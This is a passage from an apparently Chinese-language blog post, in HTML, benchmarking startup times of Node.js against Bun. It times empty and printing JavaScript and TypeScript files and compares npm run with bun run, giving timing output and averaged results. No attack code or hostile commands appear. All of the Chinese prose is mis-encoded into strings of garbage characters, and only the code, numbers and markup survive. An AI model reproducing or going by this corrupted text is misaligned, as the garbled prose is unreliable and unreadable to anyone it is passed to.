<li>è„šæœ¬ <code>--run</code> ç›´æ¥è¿è¡Œ <code>node --run foo</code> <em>Added in: v22.0.0</em> ğŸ¤¼â€â™‚ï¸ <code>bun --run foo</code></li>
</ol>
<p>ç»Ÿè®¡æ–¹æ³•ï¼Œæˆ‘ä»¬æ¨¡ä»¿ç«æŠ€æ¯”èµ›ä¸­ï¼Œå»æ‰ä¸€ä¸ªæœ€é«˜åˆ†å’Œä¸€ä¸ªæœ€ä½åˆ†ï¼Œå¯ä»¥é¿å…â€œå†·å¯åŠ¨â€ç­‰æç«¯æ•°æ®å¹²æ‰°ï¼Œé‡‡å–å»æ‰æœ€å¤§å’Œæœ€å°å€¼ç„¶åå–å¹³å‡å€¼ï¼Œè¿™æ ·<strong>æŠ—å¹²æ‰°æ€§å¼º</strong>ã€<strong>æ›´å…¬å¹³</strong>ã€‚</p>
<h2 data-id="heading-1">ç¬¬ä¸€è½®ï¼šç›´æ¥å¯åŠ¨ JS æ–‡ä»¶é€Ÿåº¦</h2>
<p>åˆ†åˆ«å¯åŠ¨ä¸¤ä¸ª mjs æ–‡ä»¶ï¼Œä¸€ä¸ªç©ºä¸€ä¸ªæœ‰ IO è¾“å‡ºã€‚æµ‹è¯•æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// empty.mjs</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// io.mjs</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hello world'</span>);

</code></pre>
<h3 data-id="heading-2">Node.js ğŸŸ¢</h3>
<p>åˆ†åˆ«æ‰§è¡Œ <code>time node empty.js</code> <code>time node io.mjs</code> å„è‡ªä¸‰æ¬¡ã€‚</p>
<p><code>â¯ time node empty.mjs</code>ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">node empty.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">78</span>% cpu <span class="hljs-number">0.217</span> total
node empty.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">84</span>% cpu <span class="hljs-number">0.203</span> total
node empty.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>16s system <span class="hljs-number">69</span>% cpu <span class="hljs-number">0.225</span> total
</code></pre>
<p>æ—  io å¹³å‡è€—æ—¶ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰ˆ</mo><mn>217</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx217ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">217</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ã€‚</p>
<p><code>â¯ time node io.mjs</code>ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">node io.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">73</span>% cpu <span class="hljs-number">0.234</span> total
node io.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">72</span>% cpu <span class="hljs-number">0.236</span> total
node io.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">74</span>% cpu <span class="hljs-number">0.229</span> total
</code></pre>
<p>io å¹³å‡è€—æ—¶ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰ˆ</mo><mn>234</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx234ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">234</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ã€‚</p>
<p>æ•´ä½“è€—æ—¶ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰ˆ</mo><mn>225</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx225ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">225</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ã€‚</p>
<h3 data-id="heading-3">Bun ğŸ</h3>
<pre><code class="hljs language-ts" lang="ts">bun empty.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>04s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">56</span>% cpu <span class="hljs-number">0.375</span> total
bun empty.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">63</span>% cpu <span class="hljs-number">0.337</span> total
bun empty.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>03s user <span class="hljs-number">0.</span>23s system <span class="hljs-number">70</span>% cpu <span class="hljs-number">0.371</span> total
</code></pre>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰ˆ</mo><mn>371</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx371ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">371</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span></p>
<pre><code class="hljs language-ts" lang="ts">bun io.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>05s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">63</span>% cpu <span class="hljs-number">0.338</span> total
bun io.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>20s system <span class="hljs-number">56</span>% cpu <span class="hljs-number">0.351</span> total
bun io.<span class="hljs-property">mjs</span>  <span class="hljs-number">0.</span>03s user <span class="hljs-number">0.</span>20s system <span class="hljs-number">62</span>% cpu <span class="hljs-number">0.369</span> total
</code></pre>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰ˆ</mo><mn>351</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx351ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">351</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span></p>
<p>æ•´ä½“ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰ˆ</mo><mn>361</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx361ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">361</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span></p>
<p>è¿™æ•°æ®æœ‰ç‚¹åå¸¸ï¼Œ1 bun å¯åŠ¨ io æ–‡ä»¶é€Ÿåº¦åè€Œå¿«äºç©ºæ–‡ä»¶ï¼Œ2 å…¶æ¬¡å¾—åˆ°æœ¬æ–‡ç¬¬ä¸€ä¸ª<strong>éå¸¸é‡è¦çš„ç»“è®ºï¼šbun å¯¹ js æ–‡ä»¶å¯åŠ¨é€Ÿåº¦åè€ŒåŠ£äº Node.js</strong>ï¼ˆäºŒè€…ç›¸å·® 100ms+ï¼‰ã€‚</p>
<h2 data-id="heading-4">ç¬¬äºŒè½®ï¼šç›´æ¥å¯åŠ¨ TS æ–‡ä»¶é€Ÿåº¦</h2>
<blockquote>
<p>[!TIP]
æ³¨æ„ï¼šæƒ³è¦ä¸åŠ å‚æ•°ç›´æ¥è¿è¡Œ TSï¼ŒNode.js ç‰ˆæœ¬éœ€ <strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰¥</mo></mrow><annotation encoding="application/x-tex">\geq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"/><span class="mrel">â‰¥</span></span></span></span></span> v22.18.0</strong>ã€‚</p>
</blockquote>
<p>åˆ†åˆ«å¯åŠ¨ä¸¤ä¸ª ts æ–‡ä»¶ï¼Œä¸€ä¸ªç©ºä¸€ä¸ªæœ‰ IO è¾“å‡ºã€‚æµ‹è¯•æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># æ–‡ä»¶å†…å®¹ä¸€æ ·</span>
empty-ts.ts
io-ts.ts
</code></pre>
<h3 data-id="heading-5">Node.js ğŸŸ¢</h3>
<pre><code class="hljs language-ts" lang="ts">node empty-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>19s system <span class="hljs-number">73</span>% cpu <span class="hljs-number">0.254</span> total
node empty-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">72</span>% cpu <span class="hljs-number">0.236</span> total
node empty-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">71</span>% cpu <span class="hljs-number">0.240</span> total
</code></pre>
<p>æ—  io å¹³å‡è€—æ—¶ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰ˆ</mo><mn>240</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx240ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">240</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ã€‚</p>
<p><code>â¯ time node io-ts.ts</code>ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">node io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">64</span>% cpu <span class="hljs-number">0.263</span> total
node io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">67</span>% cpu <span class="hljs-number">0.255</span> total
node io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">67</span>% cpu <span class="hljs-number">0.254</span> total
</code></pre>
<p>io å¹³å‡è€—æ—¶ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰ˆ</mo><mn>255</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx255ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">255</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ã€‚</p>
<p>æ•´ä½“è€—æ—¶ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰ˆ</mo><mn>248</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx248ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">248</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ã€‚</p>
<blockquote>
<p>[!TIP]
å°ç»“ï¼šNode.js è¿è¡Œ ts è€—æ—¶æ¯” js å¢åŠ  <strong>~20ms</strong>ï¼Œè¿™åœ¨é¢„æœŸå†…å› ä¸ºå…ˆè¦ <a href="https://juejin.cn/spost/7407763018472046629#heading-12" target="_blank" title="https://juejin.cn/spost/7407763018472046629#heading-12">amacro ts ç¼–è¯‘å™¨å³å°†æ‰€æœ‰ç±»å‹ç”¨ç©ºæ ¼æ›¿ä»£</a>ã€‚</p>
</blockquote>
<h3 data-id="heading-6">Bun ğŸ</h3>
<pre><code class="hljs language-ts" lang="ts">bun empty-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>04s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">69</span>% cpu <span class="hljs-number">0.372</span> total
bun empty-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>01s user <span class="hljs-number">0.</span>15s system <span class="hljs-number">45</span>% cpu <span class="hljs-number">0.372</span> total
bun empty-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>06s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">56</span>% cpu <span class="hljs-number">0.402</span> total
</code></pre>
<p>æ—  io å¹³å‡è€—æ—¶ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰ˆ</mo><mn>372</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx372ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">372</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ã€‚</p>
<pre><code class="hljs language-ts" lang="ts">bun io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>01s user <span class="hljs-number">0.</span>25s system <span class="hljs-number">64</span>% cpu <span class="hljs-number">0.405</span> total
bun io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">55</span>% cpu <span class="hljs-number">0.388</span> total
bun io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>09s user <span class="hljs-number">0.</span>23s system <span class="hljs-number">74</span>% cpu <span class="hljs-number">0.429</span> total
</code></pre>
<p>io å¹³å‡è€—æ—¶ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰ˆ</mo><mn>405</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx 405ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">405</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ã€‚</p>
<p>æ•´ä½“è€—æ—¶ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰ˆ</mo><mn>388.5</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx 388.5ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">388.5</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ã€‚</p>
<blockquote>
<p>[!TIP]
å°ç»“ï¼šBun è¿è¡Œ ts è€—æ—¶æ¯” js å¢åŠ  <strong>~20ms</strong>ï¼Œé¢„æœŸå†…ã€‚</p>
</blockquote>
<p>æœ¬æ–‡ç¬¬äºŒä¸ª<strong>ç»“è®ºï¼šbun æ‰§è¡Œ ts æ–‡ä»¶å¯åŠ¨é€Ÿåº¦åŠ£äº Node.js</strong>ï¼ˆäºŒè€…ç›¸å·® <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>388</mn><mo>âˆ’</mo><mn>248</mn><mo>=</mo><mn>140</mn><mi>m</mi><mi>s</mi><mo>+</mo></mrow><annotation encoding="application/x-tex">388 - 248 = 140ms+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">388</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">248</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">140</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mord">+</span></span></span></span></span>ï¼‰ã€‚</p>
<p>æœ‰è¯»è€…å¯èƒ½ä¼šé—®æ˜¯å¦æ˜¯é€šè¿‡ç¯å¢ƒå˜é‡å¯»å€ bun è€—æ—¶å¯¼è‡´çš„ã€‚é‚£æˆ‘ä»¬ç›´æ¥è·³è¿‡å¯»å€ï¼š</p>
<p><code>â¯ time /e/pnpm/bun io-ts.ts</code></p>
<pre><code class="hljs language-ts" lang="ts">/e/pnpm/bun io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">55</span>% cpu <span class="hljs-number">0.384</span> total
/e/pnpm/bun io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>23s system <span class="hljs-number">67</span>% cpu <span class="hljs-number">0.341</span> total
/e/pnpm/bun io-ts.<span class="hljs-property">ts</span>  <span class="hljs-number">0.</span>06s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">56</span>% cpu <span class="hljs-number">0.407</span> total
</code></pre>
<p>ç›´æ¥å¯»å€è€—æ—¶ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>384</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex"> 384ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">384</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ï¼Œç¡®å®å°‘äº <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>405</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex"> 405ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">405</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ï¼Œä½†ä¾ç„¶æ˜¾è‘—é«˜äº Node.js çš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>255</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">255ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">255</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ï¼æ‰€ä»¥</p>
<h2 data-id="heading-7">ç»“è®ºä¸€</h2>
<p>Bun æ— è®º<strong>å¯åŠ¨</strong> JavaScript è¿˜æ˜¯ TypeScript æ–‡ä»¶<strong>éƒ½è¦æ…¢äº Node.js</strong>ï¼</p>
<blockquote>
<p>æ³¨æ„è¿™é‡Œæ˜¯<strong>å¯åŠ¨</strong>è€Œéè¿è¡Œã€‚</p>
</blockquote>
<h2 data-id="heading-8">ç¬¬ä¸‰è½®ï¼špackage.json è„šæœ¬å¯åŠ¨</h2>
<p>ç»“è®ºå…ˆè¡Œï¼šæ‰§è¡Œ package.json å†…çš„ scripts <code>bun run</code> çš„å¯åŠ¨é€Ÿåº¦å¿«äº <code>npm run</code>ã€‚æˆ‘ä»¬æµ‹è¯•ä¸‹ã€‚</p>
<p>npm v11.7.0</p>
<p>æˆ‘ä»¬å®šä¹‰ä¸¤ä¸ª script io å’Œä¸å« io çš„ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"module"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"io"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"echo \"hello world\""</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"empty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">""</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-9">npm run</h3>
<p><code>â¯ time command npm run io</code></p>
<blockquote>
<p>[!TIP]
<code>command npm</code> æ˜¯å› ä¸ºæˆ‘åœ¨ <code>~/.zshrc</code> å†…å¯¹ npm åšäº†åŒå alias éœ€é€šè¿‡ <code>command</code> æ‰¾åˆ°åŸå§‹å‘½ä»¤ã€‚</p>
</blockquote>
<pre><code class="hljs language-ts" lang="ts">&gt; rsbuild-react-<span class="hljs-number">19</span>@<span class="hljs-number">1.0</span><span class="hljs-number">.0</span> io
&gt; io <span class="hljs-string">"hello world"</span>

<span class="hljs-string">"hello world"</span>
command npm run io  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>39s system <span class="hljs-number">58</span>% cpu <span class="hljs-number">0.660</span> total
</code></pre>
<pre><code class="hljs language-ts" lang="ts">command npm run io  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>34s system <span class="hljs-number">52</span>% cpu <span class="hljs-number">0.649</span> total
command npm run io  <span class="hljs-number">0.</span>01s user <span class="hljs-number">0.</span>31s system <span class="hljs-number">50</span>% cpu <span class="hljs-number">0.638</span> total
</code></pre>
<p><code>npm run io</code> è€—æ—¶ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>650</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">650ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">650</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ã€‚</p>
<p>å»é™¤ IOï¼š<code>â¯ time command npm run empty</code></p>
<pre><code class="hljs language-ts" lang="ts">command npm run empty  <span class="hljs-number">0.</span>05s user <span class="hljs-number">0.</span>32s system <span class="hljs-number">60</span>% cpu <span class="hljs-number">0.610</span> total
command npm run empty  <span class="hljs-number">0.</span>03s user <span class="hljs-number">0.</span>34s system <span class="hljs-number">59</span>% cpu <span class="hljs-number">0.626</span> total
command npm run empty  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>33s system <span class="hljs-number">53</span>% cpu <span class="hljs-number">0.611</span> total
</code></pre>
<p>çº¯å¯åŠ¨è€—æ—¶ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>616</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">616ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">616</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ã€‚</p>
<p>æ•´ä½“è€—æ—¶ï¼š<code>npm run</code> å¯åŠ¨éœ€ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰ˆ</mo><mn>600</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">\approx600ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4831em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">600</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ã€‚è¿™ä¹Ÿå¤ªæ…¢äº†ï¼Œä»£ç å•¥éƒ½æ²¡å¹²å‘¢ï¼</p>
<p>æ¥ä¸‹æ¥è¯•è¯• <code>bun run</code>ã€‚</p>
<h3 data-id="heading-10">bun run</h3>
<p><code>â¯ time bun run io</code>:</p>
<pre><code class="hljs language-ts" lang="ts">bun run io  <span class="hljs-number">0.</span>03s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">79</span>% cpu <span class="hljs-number">0.308</span> total
bun run io  <span class="hljs-number">0.</span>06s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">78</span>% cpu <span class="hljs-number">0.347</span> total
bun run io  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">68</span>% cpu <span class="hljs-number">0.313</span> total
</code></pre>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>313</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">313 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">313</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span> å·¦å³</p>
<p><code>â¯ time bun run empty</code>ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">bun run empty  <span class="hljs-number">0.</span>04s user <span class="hljs-number">0.</span>18s system <span class="hljs-number">60</span>% cpu <span class="hljs-number">0.380</span> total
bun run empty  <span class="hljs-number">0.</span>01s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">69</span>% cpu <span class="hljs-number">0.330</span> total
bun run empty  <span class="hljs-number">0.</span>03s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">67</span>% cpu <span class="hljs-number">0.361</span> total
</code></pre>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>361</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">361 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">361</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span> å·¦å³ã€‚ç¬¬äºŒä¸ªåå¸¸ io åè€Œæ›´æ…¢ã€‚</p>
<p>æ•´ä½“è€—æ—¶ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>337</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">337 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">337</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ã€‚ç»“è®º <code>bun run</code> å¤§æ¦‚æ˜¯ <code>npm run</code> çš„ä¸¤å€ï¼ˆ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>600</mn><mi mathvariant="normal">/</mi><mn>300</mn><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">600 / 300=2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">600/300</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">2</span></span></span></span></span>ï¼‰æ€§èƒ½ã€‚</p>
